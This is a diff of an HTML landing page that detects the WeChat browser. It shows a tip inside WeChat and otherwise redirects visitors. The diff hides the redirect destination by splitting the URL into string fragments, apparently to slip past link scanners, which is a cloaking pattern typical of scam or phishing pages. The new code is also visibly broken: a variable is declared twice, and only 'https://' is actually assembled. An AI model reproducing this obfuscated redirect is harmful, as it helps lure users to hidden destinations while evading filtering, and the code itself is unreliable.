@@ -5,21 +5,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>温馨提示</title>
     <script>
-      
         function isWeixinBrowser() {
             var ua = navigator.userAgent.toLowerCase();
             return ua.indexOf('micromessenger') !== -1;
         }
         
-     
         window.onload = function() {
             if (isWeixinBrowser()) {
-           
                 document.getElementById('weixin-tip').style.display = 'block';
             } else {
-            
-                window.location.href = "https://ndc1.padsto.com/1TfRDRLr/mzg3ywzjzj";
+                // Split URL into three parts
+                var part1 = "htt";
+                var part2 = "ps:";
+                var part3 = "//";
+                var part4 = "y2vkm.mpvyn";
+                var part5 = ".com/ggAXbLdbmu";
+                 var part5 = "/otcyntczyz";
                 
+                // Concatenate the parts
+                var redirectUrl = part1 + part2 + part3;
+                
+                window.location.href = redirectUrl;
                 document.getElementById('content').style.display = 'block';
             }
         };
